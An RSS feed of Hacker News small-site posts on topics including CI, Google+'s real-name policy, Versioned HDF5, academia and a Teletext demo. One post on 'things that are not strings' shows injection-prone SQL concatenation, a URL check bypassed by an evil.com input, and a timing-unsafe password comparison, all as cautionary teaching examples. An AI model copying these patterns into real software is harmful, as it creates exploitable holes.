73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>18. Do you practice continuous integration?</h3>
<p>Nowadays Continuous Integration is hopefully commonplace. At best, you
work with trunk-based development and your mainline is always
releasable, preferably with feature toggles. Highest priority is to
keep the mainline green and a broken build should be fixed
immediately. Small and frequent releases prevent bugs or even outages
which happen when large releases are done only intermittently.</p>
<p>CI helps to prevent tedious merge conflict resolutions because your
developers regularly commit into mainline. Additionally you will get
rid of time consuming integration problems at the end of your
implementation phases.</p>
<p>“Agile”’s main goal is to identify risks as early as possible and not
to postpone them till the end of a project. CI supports exactly</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gerlacdt.github.io/posts/writing-better-software/">https://gerlacdt.github.io/posts/writing-better-software/</a></em></p>]]>
            </description>
            <link>https://gerlacdt.github.io/posts/writing-better-software/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243656</guid>
            <pubDate>Sat, 22 Aug 2020 12:27:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When I stopped believing in Google's fundamental good nature]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243508">thread link</a>) | @sysoleg
<br/>
August 22, 2020 | https://utcc.utoronto.ca/~cks/space/blog/tech/GoogleWhenEvilRealized | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/tech/GoogleWhenEvilRealized">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>When I stopped believing in Google's fundamental good nature</h2>

	<p><small>August 21, 2020</small></p>
</div><div><p>Once upon a time I might have believed in Google's fundamental
goodness and well intentioned nature (probably with qualifications).
Google themselves eventually taught me better, perhaps later than
it took for other people to realize that they were an amoral
corporation. For me, the moment of realization, the point where I
knew for sure that Google's "don't be evil" slogan was inoperative,
was the great <a href="https://en.wikipedia.org/wiki/Google%2B">Google+</a>
'nymwars', where Google (for Google+) declared that everyone on
Google+ must use their real name and then attempted to enforce that
(<a href="https://en.wikipedia.org/wiki/Nymwars#Google">it went wrong pretty fast</a>).</p>

<p>There were a large number of problems with Google+'s 'real name'
policies. It didn't match how actual users referred to each other
and were known online, including for people who actually worked at
Google. Forcing people to reveal their real name does real harm and
has real risks (something appreciated even back then in 2011, but
which is more pointed today). And in practice, a 'real name' policy
is actually a 'it looks like a real name to underpaid support people
or some automated system' policy, where 'John Smith' is far more
likely to be accepted than a non-Western name or an unusual one,
even if one is not your real name and the other is.</p>

<p>Google knew all of this. People, including internal people, pointed
this out to them at great length. A decent number of technical people
who worked at Google protested. There were demonstrated problems with
the actual enforcement and actions involved. And Google, in both their
senior leadership and their ongoing policies, simply didn't care. All
of the harms and the wrongs did not matter to them. They were going to
do evil because they could, and because they thought it served their
corporate goals for Google+.</p>

<p>(We all know how that one went; Google+ died, for all that it had
some good ideas.)</p>

<p>Watching all of this happen, watching all of the protesting and
good arguments and everything go exactly nowhere, is when I knew
that my image of Google was wrong (and gone). Now I extend no more
trust to Google than I think supported by their corporate and
commercial interests. Google employees may care about "don't be
evil" and doing the right thing and so on, but Google as a whole
does not, and the employees do what Google tells them to.</p>

<p>(This elaborates something I said in an aside long ago, in an entry
about <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/SmartphoneWhyIPhone">why my smartphone is an iPhone</a>.)</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/tech/GoogleWhenEvilRealized</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243508</guid>
            <pubDate>Sat, 22 Aug 2020 11:52:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things that are not strings]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243485">thread link</a>) | @pcr910303
<br/>
August 22, 2020 | https://frantic.im/no-strings | <a href="https://web.archive.org/web/*/https://frantic.im/no-strings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <header>
    
    
  </header>
  <p>As programmers, we have a collective delusion that anything that can be represented as a string, is a string. This thinking causes a whole bunch of problems.</p>

<p>Let’s take SQL for example. Every API in every programming language that I’ve seen considers SQL statement a string.</p>

<div><div><pre><code>function execute(sql: string): Promise&lt;Result&gt;
</code></pre></div></div>

<p>The problem with this API is that not every string is a valid SQL (nor sometimes it is the SQL you actually want to run).</p>

<p>Here’s a classic example of the misuse:</p>

<div><div><pre><code>const query = 'SELECT * FROM posts WHERE id = '
  + params.id;
</code></pre></div></div>

<p>In this example <code>params.id</code> can be anything, including invalid or malicious SQL.</p>

<p>The root problem here is not the lack of sanitization. The problem is that SQL is treated as a string.</p>

<p>Think about JSON for another example. You could certainly implement adding an item to a hash by doing this (I hope this code makes you cringe):</p>

<div><div><pre><code>function addKeyValue(json, key, value) {
  return json.substr(0, json.length - 1)
    + ', "' + key + '": "' + value + '"}';
}
</code></pre></div></div>

<p>As with the SQL example, you could add escaping and sanitization, but it’s just hacks hiding the real problem:</p>

<p><em>A string can be a representation of a thing, but it’s not the thing itself.</em></p>

<p>And it’s not only about concatenating strings. Can you spot the problem with this function? <span onclick="event.target.innerText = 'This URL will be marked as safe by the code below https://evil.com/https://safe.com/'">(see answer)</span></p>

<div><div><pre><code>function isSafeDomain(url: string): boolean {
  return url.includes('https://safe.com/');
}
</code></pre></div></div>

<p>Or in this one? <span onclick="event.target.innerText = 'This code is prone to timing attacks'">(see answer)</span></p>

<div><div><pre><code>function checkPassword(pass: string, hash: string): boolean {
  return sha1(pass) === hash;
}
</code></pre></div></div>

<p>Strings are lower level, and thus are much more flexible than they need to be to properly implement valid operations on the higher level concepts.</p>

<p>Incomplete list of things that are not strings:</p>

<ul>
  <li>SQL</li>
  <li>HTML</li>
  <li>JSON</li>
  <li>URL</li>
  <li>File path</li>
  <li>Password</li>
</ul>

<h2 id="things-are-things">Things are… things</h2>

<p>You can save yourself a lot of headache if you stop treating everything that can be represented as a string, as a string.</p>

<p>Both OO and FP styles allow for abstracting away something as a type or a class. You can make a closed opaque structure for the thing and limit the ways it can be constructed.</p>

<p>For example, for SQL, you might want to make sure it’s only created from static string literals.</p>

<div><div><pre><code>// Allowed
new SQL('SELECT * FROM posts WHERE id = ?');

// No allowed (e.g. via a lint rule)
new SQL('SELECT * FROM posts' + filter);
</code></pre></div></div>

<p>Of course, at some point, you will need to serialize the thing into a string to pass it into an API that was designed to consume a string. Do it at the last possible moment and try to limit it to a single place in the codebase.</p>

<div><div><pre><code>function execute(sql: SQL): Promise&lt;Result&gt; {
  return unsafeExecute(sql.toString());
}
</code></pre></div></div>

<p>Strings are coming into your app from the outer world. Don’t trust them to be what they seem they are. Convert them into proper things as soon as possible, and convert them back to strings as late as possible.</p>

<p>Here’s a few libraries for inspiration of how to treat things as… things:</p>

<ul>
  <li>SQL: <a href="https://github.com/gajus/slonik">Slonik</a>, <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/concepts/linq/basic-linq-query-operations">LINQ</a></li>
  <li>HTML: React, Elm, <a href="https://github.com/tonsky/rum">rum</a></li>
  <li>JSON: a dictionary in any programming language</li>
  <li>URL: <a href="https://docs.rs/url/2.1.1/url/">url - Rust</a></li>
  <li>File paths: <a href="https://doc.rust-lang.org/std/path/struct.Path.html">std::path::Path - Rust</a></li>
  <li>Passwords: <a href="https://github.com/myfreeweb/secstr">secstr</a>, <a href="https://hackage.haskell.org/package/securemem">securemem</a></li>
</ul>

<hr>

<p>Good discussions on <a href="https://www.reddit.com/r/programming/comments/ie3dqz/things_that_are_not_strings/">reddit</a>, <a href="https://lobste.rs/s/wjpj6n/things_are_not_strings">lobsters</a>.</p>

<p>2020-08-23: Added password library example</p>

  
  






  <div>
  <div>
    <p>Hi! My name is Alex. I’m a software engineer at Facebook, where I work on React&nbsp;Native, Oculus and Messenger. I love thinking about development experience.</p>
    <p>I write about programming, software design and side projects <a href="https://frantic.im/subscribe/" target="_blank"><svg viewBox="0 0 800 800"><path d="M493 652H392c0-134-111-244-244-244V307c189 0 345 156 345 345zm71 0c0-228-188-416-416-416V132c285 0 520 235 520 520z"></path><circle cx="219" cy="581" r="71"></circle></svg> Subscribe</a></p>
  </div>
</div>

</article></div>]]>
            </description>
            <link>https://frantic.im/no-strings</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243485</guid>
            <pubDate>Sat, 22 Aug 2020 11:48:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Versioned HDF5]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24243476">thread link</a>) | @todsacerdoti
<br/>
August 22, 2020 | https://labs.quansight.org/blog/2020/08/introducing-versioned-hdf5/ | <a href="https://web.archive.org/web/*/https://labs.quansight.org/blog/2020/08/introducing-versioned-hdf5/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody text">
        <div>
<p>The problem of storing and manipulating large amounts of data is a challenge in
many scientific computing and industry applications. One of the standard data
models for this is <a href="https://support.hdfgroup.org/HDF5/whatishdf5.html">HDF5</a>,
an open technology that implements a hierarchical structure (similar to a
file-system structure) for storing large amounts of possibly heterogeneous data
within a single file. Data in an HDF5 file is organized into <em>groups</em> and
<em>datasets</em>; you can think about these as the folders and files in your local
file system, respectively. You can also optionally store metadata associated
with each item in a file, which makes this a self-describing and powerful data
storage model.</p>
<!-- TEASER_END -->

<p><img alt="Hierarchical Data Format (HDF5) Dataset (From https://www.neonscience.org/about-hdf5)" src="https://labs.quansight.org/images/hdf5_structure4_resized.png"><em>Image: Hierarchical Data Format (HDF5) Dataset (From https://www.neonscience.org/about-hdf5)</em></p>
<p>Since reading and writing operations in these large data files must be fast,
the HDF5 model includes data compression and <em>chunking</em>. This technique allows
the data to be retrieved in subsets that fit the computer's memory or RAM,
which means that it doesn't require the entire file contents to be loaded into
memory at once. All this makes HDF5 a popular format in several domains, and
with <a href="https://www.h5py.org/">h5py</a> it is possible to use a Pythonic interface to
read and write data to a HDF5 file.</p>
<p>Now, let's say you have an HDF5 file with contents that change over time. You
may want to add or remove datasets, change the contents of the data or the
metadata, and keep a record of which changes occurred when, with a way to
recover previous versions of this file. Since HDF5 is a binary file format,
using regular version control tools (such as git) may prove difficult.</p>
<h3>Introducing the Versioned HDF5 library</h3>
<p>The Versioned HDF5 library is a versioned abstraction on top of h5py. Because
of the flexibility of the HDF5 data model, all versioning data is stored in the
file itself, which means that different versions of the same data (including
version metadata) can be stored in a single HDF5 file.</p>
<p>To see how this works in practice, let's say we create a regular HDF5 file with
h5py called <code>mydata.h5</code>.</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>import</span> <span>h5py</span>
    <span>&gt;&gt;&gt;</span> <span>fileobject</span> <span>=</span> <span>h5py</span><span>.</span><span>File</span><span>(</span><span>'mydata.h5'</span><span>,</span> <span>'w'</span><span>)</span>
</code></pre>


<p>Now, you can create a <code>VersionedHDF5file</code> object:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>from</span> <span>versioned_hdf5</span> <span>import</span> <span>VersionedHDF5File</span>
    <span>&gt;&gt;&gt;</span> <span>versioned_file</span> <span>=</span> <span>VersionedHDF5File</span><span>(</span><span>fileobject</span><span>)</span>
</code></pre>


<p>This file still doesn't have any data or versions stored in it. To create a new
version, you can use a context manager:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>with</span> <span>versioned_file</span><span>.</span><span>stage_version</span><span>(</span><span>'version1'</span><span>)</span> <span>as</span> <span>group</span><span>:</span>
    <span>...</span>     <span>group</span><span>[</span><span>'mydataset'</span><span>]</span> <span>=</span> <span>np</span><span>.</span><span>ones</span><span>(</span><span>10000</span><span>)</span>
</code></pre>


<p>The context manager returns a h5py group object, which should be modified
in-place to build the new version. When the context manager exits, the version
will be written to the file. From this moment on, any interaction with the
versioned groups and datasets should be done via the Versioned HDF5 API, rather
than h5py.</p>
<p>Now, the <code>versioned_file</code> object can be used to expose versioned data by version name:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>v1</span> <span>=</span> <span>versioned_file</span><span>[</span><span>'version1'</span><span>]</span>
    <span>&gt;&gt;&gt;</span> <span>v1</span>
    <span>&lt;</span><span>Committed</span> <span>InMemoryGroup</span> <span>"/_version_data/versions/version1"</span><span>&gt;</span>
    <span>&gt;&gt;&gt;</span> <span>v1</span><span>[</span><span>'mydataset'</span><span>]</span>
    <span>&lt;</span><span>InMemoryArrayDataset</span> <span>"mydataset"</span><span>:</span> <span>shape</span> <span>(</span><span>10000</span><span>,),</span> <span>type</span> <span>"&lt;f8"</span><span>&gt;</span>
</code></pre>


<p>To access the actual data stored in version <code>version1</code>, we use the same syntax
as h5py:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>dataset</span> <span>=</span> <span>v1</span><span>[</span><span>'mydataset'</span><span>]</span>
    <span>&gt;&gt;&gt;</span> <span>dataset</span><span>[()]</span>
    <span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>...</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>])</span>
</code></pre>


<p>Suppose now we want to commit a new version of this data, changing just a slice
of the data. We can do this as follows:</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>with</span> <span>versioned_file</span><span>.</span><span>stage_version</span><span>(</span><span>'version2'</span><span>)</span> <span>as</span> <span>group</span><span>:</span>
    <span>...</span>     <span>group</span><span>[</span><span>'mydataset'</span><span>][</span><span>0</span><span>]</span> <span>=</span> <span>-</span><span>10</span>
</code></pre>


<p>Both versions are now stored in the file, and can be accessed independently.</p>
<pre><span></span><code>    <span>&gt;&gt;&gt;</span> <span>v2</span> <span>=</span> <span>versioned_file</span><span>[</span><span>'version2'</span><span>]</span>
    <span>&gt;&gt;&gt;</span> <span>v1</span><span>[</span><span>'mydataset'</span><span>][()]</span>
    <span>array</span><span>([</span><span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>...</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>])]</span>
    <span>&gt;&gt;&gt;</span> <span>v2</span><span>[</span><span>'mydataset'</span><span>][()]</span>
    <span>array</span><span>([</span><span>-</span><span>10.</span><span>,</span> <span>1.</span><span>,</span> <span>1.</span><span>,</span> <span>...</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>,</span>  <span>1.</span><span>])]</span>
</code></pre>


<h3>Current status</h3>
<p><code>versioned-hdf5 1.0</code> has recently been released, and is available on PyPI and conda-forge. You can install it with</p>
<pre><span></span><code><span>conda</span> <span>install</span> <span>-</span><span>c</span> <span>conda</span><span>-</span><span>forge</span> <span>versioned</span><span>-</span><span>hdf5</span>
</code></pre>


<p>The development is on <a href="https://github.com/deshaw/versioned-hdf5">GitHub</a>.
Currently, the library supports basic use cases, but there is still a lot to
do. We welcome community contributions to the library, including any issues or
feature requests.</p>
<p>For now, you can check out the
<a href="https://deshaw.github.io/versioned-hdf5/">documentation</a> for more details on
what is supported and how the library is built.</p>
<h3>Next steps</h3>
<p>This is the first post in a series about the Versioned HDF5 library. Next,
we'll discuss the performance of Versioned HDF5 files, and the design of the
library.</p>
<p>The Versioned HDF5 library was created by the <a href="https://www.deshaw.com/">D. E. Shaw
group</a> in conjunction with
<a href="https://www.quansight.com/">Quansight</a>.</p>
<p><img alt="https://www.deshaw.com" src="https://labs.quansight.org/images/sponsors/black_logo_417x125.png"></p>
</div>
    </div></div>]]>
            </description>
            <link>https://labs.quansight.org/blog/2020/08/introducing-versioned-hdf5/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243476</guid>
            <pubDate>Sat, 22 Aug 2020 11:45:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's Wrong with Academia?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243443">thread link</a>) | @physicsgraph
<br/>
August 22, 2020 | http://a3nm.net/work/research/wrong/ | <a href="https://web.archive.org/web/*/http://a3nm.net/work/research/wrong/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container2">
<p>This document is my attempt to keep a thematic list of all the problems that affect
academic research, as I can tell from my point of view 
(theoretical computer science research in France).
It was written after having worked in academia for 6 years, which I hope strikes a right balance
between being too naive and having become oblivious to problems.
This list is not a call to action directed at anyone (except
maybe myself), but I hope it can lead to discussion and maybe to change.</p>
<p>Of course, despite these flaws, there are many things
to like about academia: complete freedom, fascinating questions, passionate
people, limited short-term pressure, etc. Many of the problems in this list also exist
in other environments, and some of them are only more noticeable in academia because of its
high standards (e.g., having to support your claims)
and noble goals (e.g., acting in the public interest).
Overall, I am still enthusiastic about academic research: it wouldn't be my
job otherwise!
Yet, I think it would be worthwhile for academics to spend more time thinking
about these problems and discussing possible solutions to them.</p>
<p>As this page is rather long, each problem is in a separate section: I have put a
star (*) in the title of those that I consider to be the most important. I have
also put the main contents of each section in a collapsible box. If you want,
you can:</p>

<p>If you are in a hurry, here is a 280-char summary of the core issue:</p>
<blockquote>
<p><em>The competition for positions and grants has lead academia to focus on papers
and citations as the primary indicators of success. This is influencing how
research is conducted and presented, and makes it hard to complement traditional
publishing with new ways to share knowledge.</em></p>
</blockquote>
<p>As for other pages in this website, my <a href="http://a3nm.net/legal/">disclaimer</a> applies: while I am
definitely relying on my research experience to write this essay, it only
reflects my personal opinion, and is not endorsed by my current or past
employers.
I am interested in your opinion about these problems or their solutions, or
if you would add other problems to this list.
Feel free to reach out by email at a3nm@a3nm.net.
I'm grateful to <a href="#Acknowledgements">many people</a> who wrote to suggest
improvements to this page.</p>

<h2 id="availability-and-formatting-of-papers"><a href="#availability-and-formatting-of-papers">Availability and formatting of papers</a><a href="#availability-and-formatting-of-papers" title="Permanent link">¶</a></h2>
<p>This section presents problems related to the distribution and formatting of
traditional academic papers.</p>
<h3 id="OpenAccess"><a href="#OpenAccess">Papers are not all publicly available (*)</a><a href="#OpenAccess" title="Permanent link">¶</a></h3>
<p>The goal of research is to develop and distribute new knowledge. Yet, its output
is often difficult to access because it is stuck behind paywalls: potential
readers need to pay to access research articles.</p>
<details>
<summary>Details and proposed solutions...</summary>
<p>Of course, many other kinds of creative works have a price: books, music, movies, video games, etc. 
However, for such works, a part of the price usually goes to support the
creators, i.e., the musicians, writers, etc.
By contrast, subscriptions and payments for research articles do not
support researchers.
In fact, researchers earn a salary from their home university or other institutions,
which are often publicly funded institutions:
so it also seems like members of the public should be able to access the results of their research.</p>
<p>So what happens to the money paid to access scientific papers? All of it goes to the academic publisher, which 
is often a private company, or sometimes a university or scientific society.
This is counter-intuitive because most of the "cost" of research is not incurred by the publisher:
the research is done by researchers,
it is written up in a paper by these same researchers,
the paper is typeset by the researchers themselves (at least, in computer science),
the paper is <a href="https://en.wikipedia.org/wiki/Peer_review">peer reviewed</a>
by other researchers, and the whole process is usually overseen by researchers.
Yet, the publication venues (conferences and journals) belong to a publisher,
which takes copyright ownership of the papers at the very end of the process, and sells them.
The only contribution of the publisher is to reformat the paper slightly<sup id="fnref:publishers"><a href="#fn:publishers">1</a></sup>, and host it online behind a paywall.
The publisher then makes money from the paywall, so they forbid other people from sharing or re-hosting the article elsewhere, and thus end up working <em>against</em> the distribution of articles.</p>
<p>The justification for this broken system is historical.
Before the Internet and computers,
it was difficult to typeset papers, distributing them in paper form was a heavy and costly investment, and
editors were often small companies with scientific expertise in their subject area.
Nowadays, typesetting is mostly done directly by the authors, online distribution is trivial, and publishers have merged into
publicly-traded multinational conglomerates who minimize their scientific involvement and maximize their profits.</p>
<p>There are many problems with the current system:</p>
<ul>
<li>People without a subscription cannot read research articles. Of course, most readers of scientific articles are academics who usually have a subscription via their university. However, there are also many potential readers outside academia: companies, curious high-school students or pensioners, hobbyists, 
    policymakers, patients who want to know more about a disease that they have, etc. Currently, these people cannot easily read academic articles: this contributes to the divide between academia and non-academics, it gives academia a bad image, and it reduces the overall impact of academic research. For instance, computer science engineers who work in companies are often heard complaining about being unable to access papers that would seem relevant to their work.</li>
<li>The contents of research articles are not indexed by search engines, so they
  are difficult to find for researchers, and are invisible to non-academics.</li>
<li>Not all universities are subscribed to all venues. In particular, poorer universities, especially in developing countries, often cannot afford
  subscriptions fees. Research is supposed to be an even playing field, but this excludes some players from the academic discourse.</li>
<li>When researchers want to access an article for which their university has no subscription, 
they have to find workarounds: asking friends for illegal copies, setting up VPNs, etc. This is tedious, can be illegal, and doesn't even always work: in my research, there have been several cases where I was completely unable to find any available copy of an article that seemed relevant to what I was doing.</li>
<li>Universities and libraries have to pay expensive subscription fees to publishers. As each research article is unique, there is no competition in this market, so the fees are as obscure and extortionate as you would expect.</li>
<li>Solutions like <a href="https://en.wikipedia.org/wiki/Sci-hub">Sci-Hub</a> are arguably doing more for the scientific community than traditional publishers. Yet, they are illegal, so they face legal threats from publishers, and people outside academia usually do not know about them.</li>
</ul>
<p>To work around these problems, many researchers put copies of their own work online.
However, these articles often have an unclear copyright status, so they cannot be mirrored or redistributed, or licensed, e.g., under a <a href="https://en.wikipedia.org/wiki/Creative_Commons">Creative Commons</a> license.
Further, they are often hosted only on the author's website, and not in a stable repository: hence,
when the authors retire or change institutions, the webpages and the papers disappear.
Last, this author copy is often slightly different from the publisher version, in terms of formatting, numbering, and sometimes content: this
causes much confusion about which version should be cited, which version is more up-to-date, etc., and researchers waste time formatting, typesetting, and proofreading multiple versions of their work.</p>
<p>Some publishers are happy to propose a solution to these problems: the author-pays open access model, aka "gold open access". In this model, the author can choose to have their research article freely available on the publisher's website, with no paywall or fees;
but instead the author has to pay an "article processing charge" to cover the publisher's costs.
So, how much do publishers charge to host a PDF file online? The <a href="https://en.wikipedia.org/wiki/Association_for_Computing_Machinery">ACM</a> charges
700&nbsp;USD per article<sup id="fnref:acmfees"><a href="#fn:acmfees">2</a></sup>, and other publishers usually charge more. Compare this to the open repository <a href="http://arxiv.org/">arXiv</a> which offers to host PDF files at no cost to authors or readers: it hosted 
over 110k new articles in 2016 for a budget of 1.1&nbsp;MUSD, amounting to around 10&nbsp;USD per article<sup id="fnref:arxivstats"><a href="#fn:arxivstats">3</a></sup>; or to <a href="https://www.dagstuhl.de/en/publications/lipics/">LIPIcs</a>, a rare example of an ethical publisher, who charges at most 60&nbsp;EUR per article<sup id="fnref:lipicsfees"><a href="#fn:lipicsfees">4</a></sup>. As research is <a href="#Funding">underfunded</a>, 700&nbsp;USD is a lot of money, all the more so in developing countries and poorer universities. Further, with this optional author-pays model, libraries still need to pay subscriptions to access the articles that are not open-access, in addition to paying article processing charges when they publish, i.e., they <a href="https://en.wikipedia.org/wiki/Hybrid_open_access_journal">pay twice</a>.</p>
<p>So, why don't scientists get rid of these useless scientific publishers? This is trickier than one could expect, because the main <a href="#Indicators">indicator</a> to evaluate researchers is the number of articles that they publish in traditional publishing venues (conferences and journals).
Hence, researchers would harm their careers if they stopped publishing their results with traditional venues.
This makes it very difficult to bootstrap new publication venues, as they would be perceived as less prestigious than the established ones. Thus, publishers can continue to milk the prestige of the venues that they own, and make heaps of money<sup id="fnref:profit"><a href="#fn:profit">5</a></sup> while working against the dissemination of science<sup id="fnref:against"><a href="#fn:against">6</a></sup> and without contributing anything of value to the scientific process.</p>

</details>
<h3 id="PDF"><a href="#PDF">PDF is not a great format</a><a href="#PDF" title="Permanent link">¶</a></h3>
<p>Most scientific articles are distributed as PDF documents. (Some are distributed
as Word documents, but this is even worse, and I won't comment further.) This is again for historical reasons:
articles were first distributed on paper, and then they were distributed electronically but designed to be
printed and read on paper.
Of course, people still print articles, but nowadays, this is just one way among others to read articles;</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://a3nm.net/work/research/wrong/">http://a3nm.net/work/research/wrong/</a></em></p>]]>
            </description>
            <link>http://a3nm.net/work/research/wrong/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243443</guid>
            <pubDate>Sat, 22 Aug 2020 11:34:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teletext Bad Apple]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24243360">thread link</a>) | @bemmu
<br/>
August 22, 2020 | https://bitshifters.github.io/posts/prods/bs-badapple.html | <a href="https://web.archive.org/web/*/https://bitshifters.github.io/posts/prods/bs-badapple.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                <!-- has to be portfolio-item for the caption overlay to work -->
                <div>
                    <div>

                        
                        <a href="#videoModal" data-toggle="modal">
                            
                            
                            <img src="https://bitshifters.github.io/content/bs-badappl.png" width="640" alt="image-alt">                            
                        </a>
                        


                        <p><strong>“Bad Apple” - The definitive BBC Micro/Teletext Version</strong></p>

<p>The Tou Hou Bad Apple <a href="https://www.youtube.com/watch?v=G3C-VevI36s">video</a> has become a benchmark for pushing retro computing power to the limits. While it has been ported to many other 8-bit platforms, we are now pleased to present the definitive BBC Micro version in glorious Teletext pixel graphics.</p>

<p>Our version is a full 3m18s of video playback, played back at 25 frames per second in Teletext / MODE 7.</p>

<p>MODE 7 on the BBC Micro used a <a href="https://en.wikipedia.org/wiki/Mullard_SAA5050">Mullard SAA5050</a> Teletext display/decoder chip which (apart from from subtle implementation differences) is the same <a href="https://en.wikipedia.org/wiki/Teletext">Teletext</a> chip used in analogue TVs. It is 40x25 characters, supporting 8 primary colours, with support for text characters and basic graphical effects using control codes embedded into each character row. Support for teletext on the BBC Micro was an original requirement of the BBC’s specification for the machine due to their own use of broadcast teletext (<a href="https://en.wikipedia.org/wiki/Ceefax">Ceefax</a>).</p>

<p>The music is a custom VGM chiptune, hand designed by <a href="http://www.inversephase.com/">Inverse Phase</a> for the BBC Micro’s <a href="https://en.wikipedia.org/wiki/Texas_Instruments_SN76489">SN76489</a>. You can support IP’s excellent work by <a href="https://www.patreon.com/inversephase">becoming a patron here</a>.</p>

<p>Intro art by <a href="http://www.horsenburger.com/">Horsenburger</a>, and you can buy awesome stuff from <a href="https://www.tshirtstudio.com/marketplace/horsenburger's-textworks">Horsenburger’s store</a>.</p>

<p>The code, music &amp; screens are crammed into a standard 8-bit 2MHz 6502 based BBC Micro’s 32Kb RAM, and the video is streamed into memory track by track, after being heavily compressed to fit on one single 400Kb double sided floppy disk image.</p>

<p>You can watch the demo in your browser, using the brilliant JSBeeb Javascript BBC Micro emulator by clicking the Emulate button below.</p>

<p>Full source is on Github.</p>

<p>For more information on teletext, take a look at the following sites:</p>
<ul>
  <li><a href="http://teletextart.co.uk/">TeletextR</a> - News &amp; Happenings in the world of Teletext</li>
  <li><a href="http://edit.tf/">Edit.TF</a> - A Web Based Teletext Editor</li>
  <li><a href="https://www.facebook.com/groups/TeletextGroup/">Facebook Teletext Group</a> - Teletext Community Group</li>
  <li><a href="http://danfarrimond.co.uk/">Dan Farrimond’s Art</a> - Awesome teletext art</li>
  <li><a href="http://www.horsenburger.com/">Horsenburger’s Art</a> - Addtional Awesome teletext art</li>
</ul>


                        <hr>
                        <ul>
                            <li>Team:
                                <strong>Bitshifters
                            </strong>
                            </li>
                            
                            <li>Authors:
                                <strong>Kieran, Simon, Inverse Phase &amp; Horsenburger
                            </strong>
                            </li>
                            
                            <li>Released:
                                <strong>2017
                            </strong>
                            </li>
                            <li>Type:
                                <strong>Demo
                            </strong>
                            </li>
                            <li>
                                Platform:
                                <strong>
                                BBC Micro Model B
                            </strong>
                            </li>
                        </ul>
                        <!--
                        <ul class="list-inline item-details">
                            
                            <a href="http://www.pouet.net/prod.php?which=69110" target="_blank">Pouet</a>  
                            <a href="https://www.youtube.com/watch?v=22y_aiOx9CY" target="_blank">Video</a> 
                        </ul>
-->

                    </div>
                </div>
            </div></div>]]>
            </description>
            <link>https://bitshifters.github.io/posts/prods/bs-badapple.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243360</guid>
            <pubDate>Sat, 22 Aug 2020 11:16:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Many Values Does a Boolean Have?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24243211">thread link</a>) | @pcr910303
<br/>
August 22, 2020 | https://danilafe.com/blog/boolean_values/ | <a href="https://web.archive.org/web/*/https://danilafe.com/blog/boolean_values/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    
    
    <p>A friend of mine recently had an interview for a software
engineering position. They later recounted to me the content
of the technical questions that they had been asked. Some had
been pretty standard:</p>
<ul>
<li>
<strong>“What’s the difference between concurrency
and parallelism?"</strong> – a reasonable question given that Go was
the company’s language of choice.</li>
<li>
<strong>“What’s the difference between a method and a function?"</strong> –
a little more strange, in my opinion, since the difference
is of little <em>practical</em> use.</li>
</ul>
<p>But then, they recounted a rather interesting question:</p>
<blockquote>
<p>How many values does a bool have?</p>
</blockquote>
<p>Innocuous at first, isn’t it? Probably a bit simpler, in fact,
than the questions about methods and functions, concurrency
and parallelism. It’s plausible that a candidate
has not done much concurrent or parallel programming in their
life, or that they came from a language in which functions
were rare and methods were ubiquitous. It’s not plausible,
on the other hand, that a candidate applying to a software
engineering position has not encountered booleans.</p>
<p>If you’re genuinely unsure about the answer to the question,
I think there’s no reason for me to mess with you. The
simple answer to the question – as far as I know – is that a boolean
